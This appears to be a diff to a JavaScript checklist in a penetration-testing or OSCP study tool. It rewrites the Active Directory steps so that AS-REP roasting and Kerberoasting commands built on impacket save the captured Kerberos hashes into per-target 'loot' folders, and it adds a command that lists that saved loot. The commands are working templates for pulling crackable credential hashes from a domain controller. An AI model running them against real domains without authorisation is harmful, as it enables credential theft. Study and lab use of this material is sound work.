@@ -394,10 +394,17 @@ export const CHECKLIST = [
       },
       {
         id: "ad-roast",
-        title: "Request offline-crackable material",
+        title: "Check for AS-REP roastable users",
         commands: [
-          { label: "AS-REP", value: "impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes" },
-          { label: "Kerberoast", value: "impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{rhost}} -request -outputfile kerberoast.hashes" },
+          { label: "AS-REP into target loot", value: "loot=\"$HOME/oscp/{{targetName}}/loot/kerberos/asrep\"; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
+        ],
+      },
+      {
+        id: "ad-spn-tgs",
+        title: "Kerberoast SPN accounts into target loot",
+        detail: "The active credential and every saved account generate separate GetUserSPNs commands. Enumeration output, TGS hashes, and cracked results stay under the current target and credential identity. Switch targets with Use in commands to produce that target's paths and DC address.",
+        commands: [
+          { label: "Inventory saved SPN/TGS loot", value: "root=\"$HOME/oscp/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
         ],
       },
       {
